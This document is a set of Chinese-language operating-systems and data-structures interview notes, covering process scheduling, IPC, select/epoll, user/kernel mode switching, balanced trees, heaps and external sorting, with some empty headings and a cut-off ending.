### 3. 优先级调度 (Priority Scheduling)

*   **核心思想**：为每个进程分配一个优先级，调度器总是选择优先级最高的进程来执行。
*   **生活中的例子**：飞机场的头等舱/VIP 乘客可以优先登机。
*   **工作方式**：就绪队列中的进程按照优先级排序。
*   **优点**：
    *   **灵活性高**：可以根据进程的重要性来决定其处理顺序，满足紧急任务的需求。
*   **缺点**：
    *   **可能导致饥饿**：低优先级的进程可能永远无法被调度。
    *   **解决方案**：可以采用**老化 (Aging)** 技术，即随着时间的推移，逐步提高那些长时间等待的进程的优先级。
*   **类型**：可以是抢占式的，也可以是非抢占式的。抢占式指当一个更高优先级的进程到来时，可以中断当前正在运行的低优先级进程。

---

### 4. 时间片轮转 (Round Robin, RR)

这是一种专门为分时系统设计的算法。

*   **核心思想**：将 CPU 的时间划分成一个个小的时间片 (Time Quantum/Slice)，公平地分配给每个进程。
*   **生活中的例子**：几个小朋友轮流玩一个玩具，每个人玩一分钟，时间到了就换下一个人。
*   **工作方式**：
    1.  所有就绪进程排成一个队列。
    2.  调度器选择队首进程，让它运行一个时间片。
    3.  如果进程在一个时间片内完成，就直接退出；如果没完成，它会被移到队尾，等待下一轮。
*   **优点**：
    *   **公平性好**：每个进程都有机会执行。
    *   **响应时间快**：对于交互式应用（如用户界面）非常友好，用户不会感觉程序被“卡死”。
*   **缺点**：
    *   **上下文切换开销**：时间片设置得太短，会导致频繁的进程上下文切换，消耗大量系统资源，降低效率。
    *   **性能权衡**：时间片设置得太长，算法就退化成了 FCFS，响应时间变差。
*   **类型**：抢占式。

---

### 5. 多级队列调度 (Multilevel Queue Scheduling)

* 好的，我们来详细地剖析一下**多级队列调度 (Multilevel Queue Scheduling)** 算法。

  ### 一、核心思想：分而治之，专窗专用

  想象一下一个大型银行，如果所有客户——无论是存100块钱的普通储户，还是办理上千万对公业务的企业家——都在同一个大厅里排同一条队，那效率肯定会非常低下。

  银行的聪明做法是开设**专窗**：
  *   **普通个人业务窗口**：处理速度快，业务简单，排队的人多。
  *   **VIP理财窗口**：服务要求高，业务复杂，排队的人少。
  *   **企业对公窗口**：业务流程长，需要大量审核。

  **多级队列调度的思想与此完全一样**。它不是把所有进程都放在一个大池子里，而是根据进程的**类型或特性**，将它们预先分类，放入不同的、独立的队列中。每个队列都可以有自己的一套“服务规则”。

  这种算法的目标是：**为不同类型的进程提供最适合它们的调度策略，从而优化整个系统的性能。**

  ---

  ### 二、工作机制详解

  多级队列调度的实现包含三个关键部分：

  **1. 队列的划分 (Partitioning the Queues)**

  首先，需要将就绪队列拆分成多个独立的队列。这种划分通常基于进程的特征，例如：
  *   **系统进程 (System Processes)**：如操作系统内核任务，优先级最高。
  *   **交互式进程 (Interactive Processes)**：如文本编辑器、图形界面应用。它们需要快速响应，对等待时间敏感。
  *   **批处理进程 (Batch Processes)**：如科学计算、数据备份。它们对响应时间不敏感，但需要长时间占用 CPU。
  *   **学生进程 (Student Processes)**：在教学系统中，可能会限制学生程序的资源。

  **2. 队列内部的调度 (Scheduling within a Queue)**

  每个队列都可以拥有**自己独立的调度算法**。这是该算法灵活性的体现。
  *   **交互式队列**：通常使用**时间片轮转 (Round Robin, RR)** 算法，以保证每个进程都能快速得到响应。
  *   **批处理队列**：通常使用**先来先服务 (FCFS)** 算法，因为响应时间不重要，简单处理即可。

  **3. 队列之间的调度 (Scheduling among the Queues)**

  当多个队列里都有进程在等待时，调度器必须决定先服务哪个**队列**。主要有两种方式：

  *   **固定优先级抢占式调度 (Fixed-Priority Preemptive Scheduling)**：这是**最常见**的方式。
      *   为每个队列分配一个固定的优先级（例如，交互式队列 > 批处理队列）。
      *   调度器**总是**先处理高优先级队列中的所有进程。
      *   只有当所有高优先级队列都为空时，调度器才会去处理低优先级队列。
      *   **抢占**：如果一个低优先级队列的进程正在运行时，一个更高优先级队列中突然来了一个新进程，那么低优先级的进程会立即被中断（被抢占），CPU 会被分配给那个新来的高优先级进程。

  *   **时间片划分 (Time Slicing)**：
      *   在队列之间也划分时间。例如，CPU 时间的 80% 分配给交互式队列，20% 分配给批处理队列。
      *   这种方式可以确保低优先级队列不会被完全“饿死”。

  ---

  ### 三、一个具体的例子

  假设一个系统设置了三个队列：

  1.  **队列1 (最高优先级)**：系统进程，使用 **FCFS** 算法。
  2.  **队列2 (中等优先级)**：交互式进程，使用 **RR** 算法（时间片=10ms）。
  3.  **队列3 (最低优先级)**：批处理进程，使用 **FCFS** 算法。

  **调度流程如下：**

  1.  调度器首先检查**队列1**。只要队列1中有进程，就一直按 FCFS 规则执行它们，直到队列1为空。
  2.  当队列1为空时，调度器接着检查**队列2**。它会按 RR 规则轮流执行队列2中的进程。
  3.  如果在执行队列2的进程时，队列1突然来了一个新的系统进程，那么队列2的当前进程会被**立即抢占**，CPU 转而去执行队列1的新进程。
  4.  只有当队列1和队列2都为空时，调度器才有机会去执行**队列3**中的批处理进程。
  5.  同理，如果一个批处理进程正在运行，此时任何一个交互式进程或系统进程就绪，这个批处理进程都会被立刻抢占。





| 算法名称               | 核心思想       | 抢占式？ | 优点               | 缺点                           |
| :--------------------- | :------------- | :------- | :----------------- | :----------------------------- |
| **先来先服务 (FCFS)**  | 按到达顺序     | 非抢占   | 简单、公平         | 效率低，有护航效应             |
| **最短作业优先 (SJF)** | 优先处理短作业 | 可选     | 平均等待时间最短   | 难预测运行时间，可能饿死长作业 |
| **优先级调度**         | 按优先级高低   | 可选     | 灵活，满足紧急需求 | 可能饿死低优先级进程           |
| **时间片轮转 (RR)**    | 公平分配时间片 | 抢占     | 响应快，公平       | 上下文切换有开销               |
| **多级队列**           | 按进程类型分组 | -        | 针对性强           | 不够灵活，进程无法移动         |
|                        |                |          |                    |                                |

## 有哪些页面置换算法

## 分页和分段有什么区别

## 单设备上的socket通信会用到什么场景，为什么

## 哪些场景会用信号去进程间通信

## 进程切换和线程切换的区别？

## ***进程通信和线程通信区别是什么

## ***如何让两个不同进程的线程进行通信

## ***进程进行通信方式

### 1. 管道 (Pipe)

管道是最古老、最简单的 IPC 方式之一，它就像一个单向流动的水管。

*   **特点**:
    *   **半双工 (Half-duplex)**：数据只能在一个方向上流动。如果需要双向通信，必须建立两个管道。
    *   **只能用于亲缘关系进程**：通常只能用于父进程和子进程，或者两个兄弟进程之间。因为管道没有名字，需要通过父进程创建并继承给子进程。
    *   **内核缓冲区**：管道的本质是在内核中开辟的一块缓冲区。一端写入，另一端读取。

---

### 2. 消息队列 (Message Queue)

消息队列可以看作是一个存放在内核中的“消息链表”。

*   **特点**:
    *   **克服了管道的限制**：
        *   它允许**任意进程**之间进行通信，不要求有亲缘关系。
        *   它**不是先进先出**的，每个消息都有一个类型，接收方可以根据类型来有选择地读取消息。
    *   **生命周期随内核**：消息队列会一直存在于内核中，直到被显式删除或操作系统关闭。一个进程向队列写入消息后，即使该进程退出了，消息依然存在。
    *   **数据块结构**：它是一系列固定大小的数据块，而不是无结构的字节流。

---

<h3>3. 共享内存 (Shared Memory)</h3>

共享内存是**速度最快**的 IPC 方式，因为它**避免了数据的拷贝**。

*   **工作原理**:
    1.  一个进程在内存中创建一块共享区域。
    2.  其他进程可以将这块共享区域**映射**到自己的虚拟地址空间中。
    3.  之后，所有进程都可以像访问自己的本地内存一样，直接对这块共享区域进行读写，无需经过内核。
*   **特点**:
    *   **速度极快**：数据不需要在内核和用户空间之间来回拷贝，效率最高。
    *   **需要同步机制**：因为多个进程都在直接操作同一块内存，这和多线程共享内存的问题一样，必须使用**同步机制**（如**信号量 (Semaphore)** 或**互斥锁 (Mutex)**）来防止数据竞争和冲突。共享内存本身不提供任何同步功能。

---

### 5. 信号 (Signal)

信号是**异步**的通信方式，用于通知接收进程某个事件已经发生。

*   **特点**:
    *   **异步**：一个进程可以在任何时候向另一个进程发送信号，接收进程会被**中断**去处理这个信号。
    *   **信息量少**：它只能携带非常有限的信息，基本上就是一个“通知”的角色，不适合传输复杂的数据。
    *   **用途**：常用于处理异常、终止进程或进行简单的状态通知。例如，我们在终端按下 `Ctrl+C` 就是向当前进程发送 `SIGINT` 信号，`kill -9 PID` 就是发送 `SIGKILL` 信号。

---

### 6. 套接字 (Socket)

套接字是**最通用、最强大**的 IPC 方式，因为它不仅可以用于**同一台机器上的进程间通信**，更可以用于**不同机器之间（跨网络）的进程间通信**。

*   **特点**:
    *   **通用性**：它是网络通信的基石，几乎所有的网络应用（如浏览器、聊天软件）都基于 Socket。
    *   **客户端/服务器模型**：通常采用 Client/Server 的模式进行通信。
    *   **支持多种协议**：可以与 TCP（提供可靠的、面向连接的服务）或 UDP（提供快速的、无连接的服务）等传输层协议配合使用。

## select,poll, epoll 

好的，我们来详细地、深入地剖析 `select`。`select` 是 I/O 多路复用技术的“开山鼻祖”，虽然它在性能上有很多局限性，但理解它的工作原理，对于掌握整个 I/O 模型的发展脉络至关重要。

`select` 的核心思想是：**让程序能够同时监视多个文件描述符（`fd`），并在其中任何一个 `fd` 准备好进行 I/O 操作时，得到通知，从而避免了对每个 `fd` 进行单独的、阻塞式的轮询。**

---

### **一、`select` 的核心 API 组件**

`select` 的使用主要围绕一个核心函数和一套宏定义来操作其专用的数据结构 `fd_set`。

#### **1. 数据结构：`fd_set` (文件描述符集合)**

*   **本质**: `fd_set` 的底层实现就是一个**整型数组**，但我们通常把它想象成一个**位图 (Bitmap)**。
    ```c
    // 简化理解
    // 假设一个 long 是 32 位
    // FD_SETSIZE 通常是 1024
    long fds_bits[1024 / 32]; 
    ```
*   **作用**: 这个位图的**每一位（bit）**都代表一个文件描述符。比如，第 `i` 位就代表 `fd=i`。
*   **大小限制**: `fd_set` 的大小在编译时是固定的，由 `FD_SETSIZE` 这个宏定义决定，在大多数系统中，这个值是 **1024**。这意味着 `select` **最多只能同时监视 1024 个文件描述符**（从 0 到 1023）。这是它最著名的、也是最致命的缺陷之一。

#### **2. 操作 `fd_set` 的宏**

由于 `fd_set` 的具体实现可能因系统而异，我们不能直接去操作它的位。POSIX 标准提供了一套标准的宏来安全地操作它：

*   `FD_ZERO(fd_set *set)`: **清空**一个 `fd_set`。将位图的所有位都设置为 0。这是每次使用前的**初始化**步骤。
*   `FD_SET(int fd, fd_set *set)`: **添加**一个 `fd` 到集合中。将位图中代表 `fd` 的那一位设置为 1。
*   `FD_CLR(int fd, fd_set *set)`: 从集合中**移除**一个 `fd`。将位图中代表 `fd` 的那一位设置为 0。
*   `FD_ISSET(int fd, fd_set *set)`: **检查**一个 `fd` 是否仍然在集合中（即对应的位是否为 1）。这个宏在 `select` 返回后，用来**找出**哪些 `fd` 准备好了。

#### **3. 核心函数：`int select(int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout)`**

*   **作用**: 这是阻塞等待事件发生的核心函数。
*   **参数详解**:
    *   `nfds`: **最重要的参数之一**。它指定了被监视的所有 `fd` 中，**最大的那个 `fd` 的值加 1**。内核只需要扫描到这个位置即可，后面的就不用管了，这是一个小小的性能优化。
    *   `readfds`: 你**关心“可读”事件**的 `fd` 集合。当这个集合里的任何一个 `fd` 有数据可读时，`select` 就会返回。
    *   `writefds`: 你**关心“可写”事件**的 `fd` 集合。当这个集合里的任何一个 `fd` 的发送缓冲区不再满，可以写入数据时，`select` 就会返回。
    *   `exceptfds`: 你**关心“异常”事件**的 `fd` 集合。
    *   `timeout`: 设置**超时时间**。
        *   如果设为 `NULL`，`select` 会**永远阻塞**，直到有 `fd` 准备好。
        *   如果设为一个具体的时间值（比如 2.5 秒），`select` 最多阻塞这么久，超时后即使没有 `fd` 准备好，也会返回。
        *   如果设为 0，`select` 会立即返回，变成一个**非阻塞**的轮询。

---

### **二、`select` 的完整工作流程**

让我们用一个典型的服务器程序来走一遍 `select` 的完整流程。

**前提**: 服务器已经创建了一个 `listen_fd` 用于监听新的连接，并且已经接受了几个客户端连接，它们的 `fd` 分别是 `conn_fd1`, `conn_fd2`...

```c
// 伪代码
while (true) {

    // 1. 【用户空间】准备 fd_set (每次循环都必须重新准备)
    fd_set read_fds;
    FD_ZERO(&read_fds); // 清空集合
    
    FD_SET(listen_fd, &read_fds); // 把监听 socket 加入集合，关心新连接事件
    
    int max_fd = listen_fd;
    for (int i = 0; i < client_count; i++) {
        FD_SET(clients[i].fd, &read_fds); // 把所有已连接的客户端 socket 加入集合
        if (clients[i].fd > max_fd) {
            max_fd = clients[i].fd;
        }
    }

    // 2. 【系统调用】调用 select，程序阻塞
    //    此时，发生一次从用户空间到内核空间的上下文切换
    //    read_fds 从用户空间被【拷贝】到内核空间
    int ready_count = select(max_fd + 1, &read_fds, NULL, NULL, NULL);

    // ---- 程序被内核唤醒，从这里继续执行 ----
    
    if (ready_count < 0) {
        // 发生错误
        perror("select error");
        break;
    }
    
    // 3. 【用户空间】找出哪些 fd 准备好了
    
    // 检查监听 fd 是否有新连接
    if (FD_ISSET(listen_fd, &read_fds)) {
        // accept a new connection...
    }

    // 遍历所有客户端 fd，检查是否有数据可读
    for (int i = 0; i < client_count; i++) {
        if (FD_ISSET(clients[i].fd, &read_fds)) {
            // read data from this client...
        }
    }
}
```

#### **内核层面的工作**

当 `select` 被调用后，内核会做什么？
1.  **接收参数**: 内核接收到从用户空间**拷贝**过来的 `read_fds`。
2.  **线性扫描/轮询**: 内核会**从头到尾遍历**这个 `read_fds` 位图（从 0 到 `nfds-1`）。对于每一个被标记为 1 的 `fd`，内核都会去检查它对应的设备驱动程序，问：“你准备好读取了吗？”
3.  **休眠与唤醒**:
    *   如果一轮扫描下来，没有任何 `fd` 准备好，那么调用 `select` 的进程就会被置为**休眠**状态。
    *   当某个被监视的 `fd` 对应的硬件（如网卡）接收到数据时，会产生一个**硬件中断**。内核的中断处理程序会唤醒那个正在休眠的进程。
4.  **修改并拷贝返回**: 进程被唤醒后，内核会**再次遍历**一遍所有的 `fd`，更新 `read_fds` 的内容（只保留那些真正就绪的 `fd` 的标记），然后将这个修改后的 `fd_set` **拷贝回**用户空间。

---

### **三、`select` 的三大性能瓶颈分析**

通过上面的流程，我们可以清晰地看到 `select` 的三大性能瓶颈：

1.  **固定大小的连接数限制**: `FD_SETSIZE` (通常是 1024) 这个硬性上限，使得 `select` 无法用于需要处理上万并发连接的现代高性能服务器（C10K 问题）。

2.  **昂贵的内存拷贝**: `fd_set` 是一个**“输入输出参数”**。这意味着：
    *   **调用前**: 你需要把它从用户空间**拷贝**到内核空间，告诉内核你要监视谁。
    *   **调用后**: 内核需要把它**修改后**的副本，再从内核空间**拷贝**回用户空间，告诉你结果。
    *   当 `FD_SETSIZE` 是 1024 时，即使你只关心 2 个连接，每次调用也需要拷贝 `1024 / 8 = 128` 字节的数据。当连接数接近上限时，这个拷贝开销会非常显著。

3.  **低效的 `O(n)` 扫描**:
    *   **内核层面**: 无论有多少个连接是活跃的，内核每次都需要**线性扫描**所有你告诉它要监视的 `fd`。
    *   **用户层面**: `select` 返回后，它只告诉你“有 `ready_count` 个 `fd` 准备好了”，但**不告诉你具体是哪几个**。你必须自己**再次线性扫描**整个 `fd_set`（从 0 到 `max_fd`），用 `FD_ISSET` 挨个去检查，才能找出那些就绪的 `fd`。
    *   当总连接数很大，但同一时间只有少数连接活跃时，这两次扫描的开销是巨大的性能浪费。

好的，我们来深入地、详细地剖析 `epoll`。`epoll` 之所以被誉为 Linux 下高性能网络编程的“神器”，是因为它在设计思想上对 `select` 和 `poll` 进行了**根本性的颠覆**。

理解 `epoll` 的关键，在于理解它的**三大核心组件**、**两种工作模式**以及它如何通过**“事件驱动”**和**“共享内存”**的思想来解决性能瓶颈。

---

### **一、`epoll` 的三大核心 API 组件**

`epoll` 将 `select/poll` 的“一次性提交所有任务”的模式，拆分成了三个独立的、各司其职的步骤。

#### **1. `int epoll_create(int size)`**

*   **作用**: 在 Linux 内核中创建一个 `epoll` 实例，并返回一个指向它的文件描述符（我们称之为 `epfd`）。
*   **比喻**: 这就像在总机系统里为你**开辟一个专属的、高级的“监控室”**。这个 `epfd` 就是进入这个监控室的钥匙。
*   **内部结构**: 这个“监控室”里，内核为你维护了两个核心的数据结构：
    1.  **红黑树 (Red-Black Tree)**: 用来存放你所有**“感兴趣”**的 socket `fd`。红黑树保证了即使在高并发下，对这个列表进行增、删、改、查的操作，其时间复杂度都是高效的 `O(log n)`。这就是你的**“关注列表 (interest list)”**。
    2.  **双向链表 (Doubly Linked List)**: 用来存放所有已经**“准备就绪”**的 `fd`。这就是你的**“就绪列表 (ready list)”**。
*   **`size` 参数**: 在早期的内核版本中，这个参数用来告诉内核你大概要监控多少个 `fd`，以便内核分配初始内存。但在现代 Linux 内核中，这个参数**已经被忽略**，内核会自动动态调整大小。你只需要传入一个大于 0 的数即可。

#### **2. `int epoll_ctl(int epfd, int op, int fd, struct epoll_event *event)`**

*   **作用**: 对 `epfd` 所代表的那个“监控室”里的“关注列表”进行**增、删、改**操作。
*   **比喻**: 这是你用来**管理“关注列表”**的对讲机。
*   **参数详解**:
    *   `epfd`: `epoll_create` 返回的那个钥匙。
    *   `op`: 你要执行的操作，主要有三种：
        *   `EPOLL_CTL_ADD`: **添加**一个新的 `fd` 到关注列表。
        *   `EPOLL_CTL_MOD`: **修改**一个已存在的 `fd` 所关注的事件。
        *   `EPOLL_CTL_DEL`: 从关注列表中**删除**一个 `fd`。
    *   `fd`: 你要操作的具体那个 socket `fd`。
    *   `event`: 一个 `epoll_event` 结构体，用来告诉内核你关心这个 `fd` 的什么事件（比如 `EPOLLIN` - 可读，`EPOLLOUT` - 可写）。

*   **核心优势**: 这个操作是**增量式**的。一旦你通过 `epoll_ctl` 把一个 `fd` 加入了内核的关注列表，除非你再次调用 `epoll_ctl` 去修改或删除它，否则它就一直存在于内核中。你**不需要**在每次等待事件时，都把整个列表重新提交一遍。这就**根除了 `select/poll` 的重复内存拷贝问题**。

#### **3. `int epoll_wait(int epfd, struct epoll_event *events, int maxevents, int timeout)`**

*   **作用**: 这是**阻塞等待**事件发生的主循环函数。
*   **比喻**: 这是你坐在监控室里，**等待警报响起**的动作。
*   **工作原理 (事件驱动)**:
    1.  你调用 `epoll_wait`，如果“就绪列表”是空的，你的程序就会**阻塞（睡觉）**。
    2.  在内核层面，当一个被你关注的 `fd` 对应的设备（比如网卡）接收到数据时，会产生一个**硬件中断**。
    3.  内核的中断处理程序被唤醒，它处理完数据后，会检查这个 `fd` 是否在某个 `epoll` 实例的“关注列表”中。
    4.  如果存在，内核就会把这个 `fd` **添加**到与 `epfd` 关联的那个**“就绪列表”**中。这个过程是**内核主动完成的，而不是 `epoll_wait` 去轮询发现的**。
    5.  一旦“就绪列表”不为空，`epoll_wait` 就会被**唤醒**。
    6.  `epoll_wait` 的工作非常简单：它只是把“就绪列表”中的 `fd` **拷贝**到你传入的 `events` 这个数组中，并返回实际就绪的 `fd` 数量。

*   **核心优势**:
    *   **没有轮询**: 内核不再需要线性扫描所有被监控的 `fd`。
    *   **高效返回**: `epoll_wait` 返回时，你拿到的 `events` 数组里，**全都是已经准备好的 `fd`**。你不需要再自己遍历一个巨大的集合去查找。
    *   **性能与总连接数无关**: `epoll` 的性能只取决于**当前活跃的连接数**，而不是你监控的总连接数。这使得它能够轻松应对 C10K 甚至 C100K 的挑战。

---

### **三、总结：`epoll` 为什么是革命性的？**

| 对比 `select/poll`   | `epoll` 的解决方案                                           |
| :------------------- | :----------------------------------------------------------- |
| **重复拷贝监控列表** | 通过 **`epoll_ctl` 增量管理**，内核与用户共享一份列表，避免了拷贝。 |
| **内核线性扫描**     | 通过**硬件中断回调**机制，内核不再轮询，而是事件主动上报。   |
| **用户线性扫描**     | `epoll_wait` **直接返回就绪列表**，用户无需自己查找。        |
| **核心思想**         | 轮询模型                                                     |
| **性能瓶颈**         | `O(总连接数)`                                                |

## 用户态和内核态是如何切换的？用户态和内核态的区别

1.  **权限隔离**: 你（用户程序）永远无法直接操作核心资源（硬件、内核数据）。
2.  **受控入口**: 你只能通过操作系统提供的**唯一、合法的入口**（系统调用）来请求服务。
    1.  **模式切换**: 当内核开始为你服务时，CPU 的“身份”就从“客户代表”切换成了“银行职员”，权限等级提升。


---

### 二、技术上的实现：CPU 的特权级别

现代 CPU 自身就提供了硬件级别的支持，通常被称为**特权级别 (Privilege Levels)** 或**环 (Rings)**。

*   **Ring 0 (内核态)**: 权限最高。操作系统内核就运行在这一层。它可以执行所有 CPU 指令，访问所有内存和硬件设备。
*   **Ring 3 (用户态)**: 权限最低。普通的用户应用程序运行在这一层。它只能执行一部分“安全”的指令，只能访问被操作系统分配给它自己的虚拟内存空间。

**用户态到内核态的切换，本质上就是 CPU 的执行状态从 Ring 3 切换到 Ring 0 的过程。** 这个切换不是通过一个简单的函数调用完成的，它必须通过一个特殊的、由硬件支持的指令，这个指令就像是银行柜台上的那个“窗口”。

---

### 三、三种主要的切换方式

从用户态切换到内核态，主要有以下三种途径。这些途径都是由**用户程序无法预测或控制的事件**触发的。

#### 1. 系统调用 (System Call) - 最主要、最主动的方式

这是用户程序为了获得内核的服务而**主动**发起的切换。

*   **触发场景**: 当你的程序需要执行一些它没有权限做的事情时，就必须请求内核帮忙。比如：
    *   **文件操作**: 打开、读取、写入文件 (`open`, `read`, `write`)。用户程序不能直接操作硬盘。
    *   **网络通信**: 创建套接字、发送、接收数据 (`socket`, `send`, `recv`)。用户程序不能直接控制网卡。
    *   **内存管理**: 申请更多内存 (`mmap`, `brk`)。
    *   **进程控制**: 创建新进程 (`fork`)、结束进程 (`exit`)。

*   **切换过程**:
    1.  **用户态**: 应用程序调用一个库函数（如 C 库中的 `printf`）。
    2.  **陷入 (Trap)**: 这个库函数内部会准备好系统调用所需的参数（比如要写入的数据、文件描述符等），然后执行一条特殊的 CPU 指令，比如 `int 0x80` (在 x86 早期) 或 `syscall` (在 x86-64)。
    3.  这条指令会触发一个**软件中断**，使 CPU **立即暂停**当前的用户代码执行。
    4.  CPU 将当前的执行状态（如程序计数器、栈指针等）保存起来，然后根据中断向量表，跳转到操作系统内核中预设好的**中断处理程序**。同时，CPU 的特权级别从 Ring 3 **切换到 Ring 0**。
    5.  **内核态**: 内核的中断处理程序接管控制权。它会检查参数的合法性，然后执行相应的内核代码来完成用户的请求（比如把数据写入到与显示器相关的内核缓冲区）。
    6.  **返回**: 内核服务完成后，会执行另一条特殊的指令（如 `iret` 或 `sysret`），将之前保存的用户态上下文恢复，并将 CPU 的特权级别**从 Ring 0 切换回 Ring 3**。
    7.  **用户态**: 用户程序从刚才被中断的地方继续执行，就好像什么都没发生过一样，只是它请求的操作已经完成了。

#### 2. 中断 (Interrupt) - 来自外部硬件的“敲门”

当中断发生时，CPU 必须立即停止当前的工作（无论是在用户态还是内核态），去处理这个中断。如果当时正在用户态，这就导致了一次被动的切换。

*   **触发场景**: 来自外部硬件设备的信号，需要操作系统立即处理。
    *   **键盘输入**: 你在键盘上按下一个键。
    *   **鼠标移动**: 你移动或点击鼠标。
    *   **网卡收到数据**: 网络上传来一个数据包。
    *   **定时器到期**: 操作系统的调度器需要用定时器中断来切换不同的进程。

*   **切换过程**: 和系统调用非常相似。
    1.  **用户态**: 你的程序正在愉快地运行。
    2.  **中断信号**: 硬件（如网卡）向 CPU 发送一个中断信号。
    3.  CPU 收到信号后，**立即暂停**当前用户代码，保存现场，然后根据中断号跳转到内核中对应的**中断服务程序**，并将特权级别切换到 Ring 0。
    4.  **内核态**: 内核处理这个硬件事件（比如把网卡收到的数据拷贝到内核缓冲区）。
    5.  **返回**: 处理完毕后，恢复现场，切换回 Ring 3，用户程序继续执行。

#### 3. 异常 (Exception) - 程序自己“犯错”了

当用户程序在执行过程中，发生了 CPU 无法处理的错误或特殊情况时，会触发异常。

*   **触发场景**:
    *   **缺页异常 (Page Fault)**: 程序试图访问一个有效的虚拟地址，但该地址对应的数据目前不在物理内存中（可能被换到磁盘上了）。这是一个非常常见且正常的异常。
    *   **除以零**: 执行了数学上非法的操作。
    *   **非法指令**: 试图执行一个 CPU 不认识的指令。
    *   **段错误 (Segmentation Fault)**: 试图访问一个它无权访问的内存地址（比如访问内核空间或空指针）。

*   **切换过程**:
    1.  **用户态**: 程序执行到一条错误指令（如 `mov [0x0], eax`）。
    2.  CPU 检测到这个错误，无法继续执行，于是触发一个内部的**异常**。
    3.  和中断类似，CPU 暂停程序，保存现场，跳转到内核中对应的**异常处理程序**，切换到 Ring 0。
    4.  **内核态**: 内核分析异常的类型。
        *   如果是**缺页异常**，内核会去磁盘把数据加载到内存，然后返回用户态让程序重试这条指令。
        *   如果是**严重的错误**（如段错误），内核会认为这个程序已经不可救药了，就会发送一个信号（如 `SIGSEGV`）来**终止**这个程序。
    5.  **返回/终止**: 根据处理结果，要么切换回用户态继续执行，要么直接终止用户进程。

# 数据结构

## 快排和归并的过程和时间复杂度

## avl和红黑树

这是一个关于数据结构中 **自平衡二叉查找树 (Self-Balancing Binary Search Tree, BST)** 的经典对比问题。

**AVL 树** 和 **红黑树 (Red-Black Tree, RBT)** 的主要区别在于它们的 **平衡严格程度** 和 **性能侧重**。

**AVL 树与红黑树的区别**

| 特性/方面          | AVL 树                                                       | 红黑树 (Red-Black Tree)                                      |
| ------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
| **平衡条件**       | **严格平衡**：任意节点的 **左右子树高度差的绝对值** **不能超过 1**。 | **弱平衡/局部平衡**：遵循一系列红黑规则（如红色节点不能相邻），通过颜色属性来确保最长路径不超过最短路径的两倍。 |
| **平衡程度**       | **高**。保持了更严格的平衡。                                 | **相对低**。允许更高的不平衡，但仍能保证对数时间复杂度。     |
| **查找性能**       | **更好。** 由于平衡性更严格，树的高度更小，查找（Search）更快。 | **略逊于 AVL 树。** 查找的常数因子通常比 AVL 树大。          |
| **插入/删除性能**  | **较差。** 为了维护严格的平衡，插入和删除时可能需要进行 **多次旋转** 和调整（例如双旋转）。 | **更好。** 插入和删除时平均只需要 **O(1) 次旋转**（最多 3 次重新着色和 2 次旋转），调整操作更轻量。 |
|                    |                                                              |                                                              |
| **应用场景**       | **查找密集型** 的应用，一旦构建好，极少修改，例如内存中的静态数据集。 | **插入/删除操作频繁** 的应用，例如实时操作系统、数据库索引、**标准库实现（如 C++ STL 的 `std::map` / Java 的 `TreeMap`）**。 |
| **最坏时间复杂度** | 查找、插入、删除都是logn                                     | 查找、插入、删除都是 logn                                    |

* 红黑树是一种**自平衡二叉搜索树（Balanced BST）**，
   通过为节点增加红黑两种颜色并保持一定的**颜色性质约束**，
   在保证**插入、删除、查找时间复杂度 O(log n)** 的同时，
   用较少的旋转操作维持近似平衡。

* ##  二、红黑树的五条性质

  1. 每个节点要么是红色，要么是黑色；
  2. 根节点是黑色；
  3. 所有叶子节点（NIL节点）都是黑色；
  4. 如果一个节点是红色，那么它的两个子节点一定是黑色（**红色节点不能相邻**）；
  5. 从任意节点到其每个叶子节点的所有路径上，**黑色节点数相同**（**黑高一致**）。

## 栈的使用场景

* 括号匹配检查
* 函数累计调用里面的栈帧
* 撤销操作和浏览器前进后退操作

## 堆

* 出堆：将堆顶元素弹出，然后将数组的最后一个元素（即最右侧的叶子节点）放到堆顶，尝试把他下沉
* 入堆：把元素放到数组最后一个位置，即最右侧的叶子节点，尝试上浮
* 一般用数组实现堆
* 出堆，入堆，删除都是logn的时间复杂度，然后建堆时间复杂度

#### 堆的使用场景

* 优先级队列 :操作系统的进程调度、定时任务的执行、异步消息队列中需要优先处理的消息
* 堆排序
* topk问题

#### 堆求解topk问题：

- 先从n中取出前k个元素，组成一个小顶堆，此时堆顶元素是最小的，我们从K+1个元素开始，和堆顶元素进行比较，如果比堆顶元素小，那么不做处理，继续下一个；如果比堆顶元素大，那么把堆顶元素删除，并插入k+1这个元素；等到n个元素全部遍历完，那么小顶堆中的k个元素就是Top-k数据了；
- 对于外部不断添加进来的数据其实思路是一样的，把它当成数据源，不断地和堆顶元素比较，重复上面的步骤操作即可。

时间主要耗费在一开始k个元素的初始建堆O(logk)上，还有删除堆顶元素和插入新元素时的堆化O(logk)上；所以，总的时间复杂度应该为O(nlogk)，比使用排序来获取Top-k的O(nlogn)还是要高效的。

## 快排求解topk问题

# 场景题

## 内存有限，排序一千万条数据，怎么排序

这是一个非常经典的面试题，它考察的是在资源受限的情况下处理大规模数据的能力。解决这个问题的标准方案是 **外部排序 (External Sorting)**。

核心思想非常简单，就是一种“分而治之”（Divide and Conquer）的策略：

1.  **分割 (Split)**：因为不能一次性将所有数据读入内存，所以我们将大文件分割成内存可以容纳的小块。
2.  **内部排序 (Sort)**：将每个小块依次读入内存，使用高效的内存排序算法（如快速排序）进行排序。
3.  **归并 (Merge)**：将这些已经排好序的小块文件，通过一种高效的方式合并成一个最终的有序大文件。

---

### 一个生动的比喻

想象一下，你有一副由1000万张卡片组成的巨大扑克牌堆需要排序，但你只有一张很小的桌子（有限的内存）。

1.  **分批整理（分割与内部排序）**：你从大牌堆里抓一小把你能拿得动的牌（比如100张）放到桌子上。在桌子上，你可以快速地把这100张牌理好顺序。理好后，你把这100张有序的牌堆成一小堆，放到地板上。你重复这个过程，直到把所有的大牌堆都变成了地板上的一堆堆有序的小牌堆。
2.  **合并小牌堆（归并）**：现在地板上有一堆堆已经排好序的小牌堆。你从每个小牌堆的顶上各拿一张牌放在手里。然后，你从手里的牌中选出最小的那一张，放到一个新的、最终的牌堆里。你再从刚刚被拿走牌的那个小牌堆顶上补充一张到手里。不断重复“从手里选最小的 -> 放入最终牌堆 -> 补充一张新牌”这个过程，直到所有小牌堆都被合并完。最终，你就得到了一个完全有序的巨大牌堆。

---

### 技术实现步骤详解

#### **阶段一：分割与内部排序 (Split and In-Memory Sort)**

1.  **确定块大小**：根据可用的内存大小，确定每个数据块（Chunk）的大小。例如，如果内存能容纳100万条数据，我们就以100万条为一块。
2.  **读取与排序**：
